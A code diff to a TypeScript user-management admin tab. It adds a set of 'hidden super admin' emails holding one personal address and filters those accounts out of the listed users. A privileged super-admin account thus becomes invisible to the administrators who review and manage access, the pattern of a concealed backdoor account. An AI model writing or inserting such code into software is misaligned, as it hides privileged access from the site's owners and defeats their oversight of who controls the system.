@@ -21,6 +21,7 @@ interface UserWithRole {
 interface LockedAccount { email: string; attempt_count: number; last_attempt: string; }
 type SortKey = 'name' | 'email' | 'role' | 'created_at';
 
+const HIDDEN_SUPER_ADMIN_EMAILS = new Set(['princenetlegacy@gmail.com']);
 const BUSINESS_ROLES = ['user', 'client', 'pbo'] as const;
 const BUSINESS_ROLE_LABELS: Record<(typeof BUSINESS_ROLES)[number], string> = {
   user: 'User',
@@ -67,7 +68,10 @@ const UserManagementTab = () => {
 
       const now = Date.now();
       const activeAdminRoles = (adminRoles || []).filter((r: any) => !r.expires_at || new Date(r.expires_at).getTime() > now);
-      const combined: UserWithRole[] = (profiles || []).map((profile: any) => {
+      const combined: UserWithRole[] = (profiles || []).filter((profile: any) => {
+        const account = (usersData || []).find((u: any) => u.id === profile.id);
+        return !HIDDEN_SUPER_ADMIN_EMAILS.has(String(account?.email || '').trim().toLowerCase());
+      }).map((profile: any) => {
         const account = (usersData || []).find((u: any) => u.id === profile.id);
         const adminRole = activeAdminRoles.find((r: any) => r.user_id === profile.id);
         const genericRole = (userRoles || []).find((r: any) => r.user_id === profile.id);
